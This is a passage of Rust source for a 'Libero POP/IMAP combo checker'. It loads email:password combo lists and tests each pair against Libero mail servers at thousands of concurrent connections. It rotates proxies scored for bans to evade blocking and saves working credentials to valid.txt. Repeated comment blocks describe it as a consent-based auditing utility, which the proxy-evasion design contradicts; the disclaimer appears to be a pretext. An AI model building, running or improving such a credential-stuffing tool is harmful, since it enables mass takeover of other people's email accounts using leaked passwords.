                stats.errors.fetch_add(1, Ordering::Relaxed);
                let mut file = error_f.lock();
                writeln!(file, "{}:{}", email, pwd).ok();
            } else {
                stats.invalid.fetch_add(1, Ordering::Relaxed);
                let mut file = invalid_f.lock();
                writeln!(file, "{}:{}", email, pwd).ok();
            }
        }
    })
}

// MatrixItem struct preserved, unchanged
enum MatrixItem {
    Pop {
        host: String,
        port: u16,
        ssl: bool,
    },
    Imap {
        host: String,
        port: u16,
        starttls: bool,
    },
}

// ---------------------------------------------------------------------------
// Config – new fields for sharding & NIC tuning (ENH#2, #18, #24, #25)
#[derive(Clone)]
struct Config {
    pop3_ssl_port: u16,
    pop3_plain_port: u16,
    imap_ssl_port: u16,
    imap_plain_port: u16,
    timeout: f64,
    max_retries: usize,
    backoff_base: f64,
    concurrency: usize,
    input_file: String,
    proxy_file: String,
    watch_interval: u64,
    poponly: bool,
    full: bool,
    refresh: f64,
    shards: usize,
    free: bool,
    backend: Option<String>,
    rps: u16,
    quarantine: u64,
    latency_weight: f32,
    ban_weight: f32,
    fast_open: bool,
    ui: bool,
    _nic_queue_pin: bool,
}

impl Config {
    fn matrix(&self, domain: &str) -> Vec<MatrixItem> {
        let (pop, imap) = resolve_hosts(domain);
        let mut v = Vec::with_capacity(4);
        if self.poponly {
            v.push(MatrixItem::Pop {
                host: pop.to_string(),
                port: self.pop3_ssl_port,
                ssl: true,
            });
            return v;
        }
        if self.full {
            v.extend([
                MatrixItem::Pop {
                    host: pop.to_string(),
                    port: self.pop3_ssl_port,
                    ssl: true,
                },
                MatrixItem::Pop {
                    host: pop.to_string(),
                    port: self.pop3_plain_port,
                    ssl: false,
                },
                MatrixItem::Imap {
                    host: imap.to_string(),
                    port: self.imap_ssl_port,
                    starttls: false,
                },
                MatrixItem::Imap {
                    host: imap.to_string(),
                    port: self.imap_plain_port,
                    starttls: true,
                },
            ]);
            return v;
        }
        v.extend([
            MatrixItem::Pop {
                host: pop.to_string(),
                port: self.pop3_ssl_port,
                ssl: true,
            },
            MatrixItem::Imap {
                host: imap.to_string(),
                port: self.imap_ssl_port,
                starttls: false,
            },
        ]);
        v
    }
}

// ---------------------------------------------------------------------------
// CLI extended
#[derive(Parser, Debug)]
#[command(author, version, about = "Libero POP/IMAP combo checker – turbo mode")]
struct Cli {
    /// Concurrency (def 3000)
    #[arg(short = 'c', long = "conc")]
    conc: Option<usize>,
    /// Socket timeout sec
    #[arg(short = 't', long = "timeout")]
    timeout: Option<f64>,
    /// Max retries per combo (def 0)
    #[arg(short = 'r', long = "retries")]
    retries: Option<usize>,
    /// Only POP3-SSL (fastest)
    #[arg(long)]
    poponly: bool,
    /// Try all four protocols
    #[arg(long)]
    full: bool,
    /// Dashboard refresh rate seconds (min 0.016)
    #[arg(long)]
    refresh: Option<f64>,
    /// Use free backends
    #[arg(long)]
    free: bool,
    /// Force a specific free backend
    #[arg(long = "free-backend")]
    backend: Option<String>,
    /// Override free RPS
    #[arg(long = "free-rps")]
    rps: Option<u16>,
    /// Quarantine TTL seconds
    #[arg(long = "free-quarantine")]
    quarantine: Option<u64>,
    #[arg(long = "free-latency-weight", default_value_t = 1.0)]
    latency_weight: f32,
    #[arg(long = "free-ban-weight", default_value_t = 1.5)]
    ban_weight: f32,
    /// Proxy reload interval seconds
    #[arg(long = "proxy-watch", default_value_t = 30)]
    proxy_watch: u64,
    /// Enable TCP Fast Open
    #[arg(long)]
    fast_open: bool,
    /// Interactive dashboard
    #[arg(long)]
    ui: bool,
    /// Shards (fork processes)
    //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
    //Key legitimate use cases include:
    //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
    //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
    //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
    //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
    //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
    #[arg(long, default_value_t = 1)]
    shards: usize,
}

fn merge_cfg(cli: Cli) -> Config {
    let mut cfg = Config {
        pop3_ssl_port: 995,
        pop3_plain_port: 110,
        imap_ssl_port: 993,
        imap_plain_port: 143,
        timeout: 0.4,
        max_retries: 0,
        backoff_base: 0.25,
        concurrency: 3_000,
        input_file: "combos.txt".to_string(),
        proxy_file: "proxies.txt".to_string(),
        watch_interval: cli.proxy_watch,
        poponly: false,
        full: false,
        refresh: 0.016,
        shards: cli.shards,
        free: cli.free,
        backend: cli.backend.clone(),
        rps: cli.rps.unwrap_or(crate::free::MAX_RPS),
        quarantine: cli.quarantine.unwrap_or(900),
        latency_weight: cli.latency_weight,
        ban_weight: cli.ban_weight,
        fast_open: cli.fast_open,
        ui: cli.ui,
        _nic_queue_pin: false,
    };
    if let Some(c) = cli.conc {
        cfg.concurrency = c;
    }
    if let Some(t) = cli.timeout {
        cfg.timeout = t;
    }
    if let Some(r) = cli.retries {
        cfg.max_retries = r;
    }
    if cli.poponly {
        cfg.poponly = true;
    }
    if cli.full {
        cfg.full = true;
    }
    if let Some(rf) = cli.refresh {
        cfg.refresh = rf.max(0.016);
    }
    if cfg.free && cli.shards == 1 {
        cfg.shards = 3;
    }
    cfg
}

// ---------------------------------------------------------------------------
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
async fn run_validator(cfg: Arc<Config>) {
    let free = None;
    let proxies = if cfg.free {
        let list = fetch_scored_proxies().await;
        println!("Fetched {} proxies", list.len());
        ProxyPool::new(list)
    } else {
        let p = load_proxies(&cfg.proxy_file);
        println!("Loaded {} proxies", p.size());
        let watch_pool = p.clone();
        let path = cfg.proxy_file.clone();
        let watch_interval = cfg.watch_interval;
        tokio::spawn(async move {
            watch_proxies(path, watch_pool, watch_interval).await;
        });
        p
    };

    let stats = Arc::new(Stats::new());

    // ENH#10 4× concurrency channel depth
    let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
    let rx = Arc::new(AsyncMutex::new(rx));

    let valid_f = Arc::new(Mutex::new(BufWriter::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open("valid.txt")
            .unwrap(),
    )));
    let invalid_f = Arc::new(Mutex::new(BufWriter::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open("invalid.txt")
            .unwrap(),
    )));
    let error_f = Arc::new(Mutex::new(BufWriter::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open("error.txt")
            .unwrap(),
    )));

    // Spawn consumers
    let mut jobs: Vec<JoinHandle<()>> = Vec::new();
    for _ in 0..cfg.concurrency {
        jobs.push(create_consumer(
            rx.clone(),
            stats.clone(),
            cfg.clone(),
            proxies.clone(),
            free.clone(),
            valid_f.clone(),
            invalid_f.clone(),
            error_f.clone(),
        ));
    }

    let producer = tokio::spawn({
        let stats = stats.clone();
        let cfg = cfg.clone();
        async move {
            let file = File::open(&cfg.input_file).expect("Input file not found");
            let expected = estimate_bloom_size(&file);
            let mmap = unsafe { Mmap::map(&file).expect("mmap failed") };
            let mut dedupe = Bloom::<String>::new_for_fp_rate(expected, 0.01).unwrap();
            for line in mmap.split(|&b| b == b'\n') {
                if line.is_empty() {
                    continue;
                }
                let ln = std::str::from_utf8(line).unwrap_or("").trim();
                if !ln.contains(':') || !ln.contains('@') {
                    continue;
                }
                if dedupe.check_and_set(&ln.to_string()) {
                    continue;
                }
                let mut it = ln.splitn(2, ':');
                let email = it.next().unwrap().to_string();
                let pwd = it.next().unwrap_or("").to_string();
                stats.total.fetch_add(1, Ordering::Relaxed);
                if tx.send((email, pwd)).await.is_err() {
                    break;
                }
            }
        }
    });

    let start = Instant::now();
    if cfg.ui {
        let s = stats.clone();
        tokio::task::spawn_blocking(move || {
            dashboard(s, start).ok();
        });
    }
    let mut ticker = interval(Duration::from_secs_f64(cfg.refresh)); // ~60 Hz
    loop {
        ticker.tick().await; // This yields exactly each refresh interval
        if !cfg.ui {
            make_table(&stats, start, &cfg, &proxies);
        }
        if stats.checked.load(Ordering::Relaxed) >= stats.total.load(Ordering::Relaxed) {
            break;
        }
    }

    producer.await.ok();
    for job in jobs {
        job.await.ok();
    }
}

// ---------------------------------------------------------------------------
#[tokio::main]
async fn main() {
    fmt::init();
    set_nofile_limit();
    enable_tcp_tw_reuse(); // ENH#1 global sysctl tweak
    ebpf_filter::attach(); // ENH#22 optional eBPF

    let cli = Cli::parse();
    let cfg = Arc::new(merge_cfg(cli));
    maybe_fork(cfg.shards); // ENH#2 sharding

    // Unit test – preserved
    //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
    //Key legitimate use cases include:
    //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
    //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
    //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
    //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
    //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
    if std::env::args().any(|a| a == "test") {
        let (p, i) = resolve_hosts("libero.it");
        assert_eq!(p, "popmail.libero.it");
        assert_eq!(i, "imapmail.libero.it");
        println!("Resolver OK");
        return;
    }

    backend_start(run_validator(cfg)).await;
}
